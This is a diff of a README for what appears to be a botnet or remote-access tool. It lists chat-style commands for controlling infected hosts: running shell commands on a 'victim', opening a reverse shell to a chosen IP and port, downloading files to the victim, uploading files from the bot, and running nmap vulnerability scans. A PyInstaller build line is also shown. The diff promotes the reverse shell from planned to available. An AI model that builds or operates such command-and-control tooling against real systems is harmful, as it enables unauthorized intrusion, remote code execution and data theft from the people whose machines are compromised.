@@ -18,8 +18,6 @@ bnt: @udbnt
 # Soon
 * Web automation to provide bots
 * !webcampic
-* !revshell < IP > < PORT >
-* !nmap
 * ?
 
 # Bot Commands
@@ -38,9 +36,10 @@ bnt: @udbnt
 
 * !info.< HOSTNAME >@< IP >                      (Send IP Information)
 * !shell.< HOSTNAME >@< IP > < CMD >             (Run command)
-* !download.< HOSTNAME > < IP > < URL > < NAME > (Download file to victim)
+* !revshell.< HOSTNAME >@< IP > < IP > < PORT >  (Reverse shell)
+* !download.< HOSTNAME >@< IP > < URL > < NAME > (Download file to victim)
 * !upload.< HOSTNAME >@< IP > < PATH >           (Upload file to bot)
-* !nmap.< HOSTNAME >@< IP >                      (Nmap detailed subnet scan)
+* !nmap.< HOSTNAME >@< IP >                      (Nmap vuln scan)
 
 # Linux build
 pyinstaller --onefile Client.py
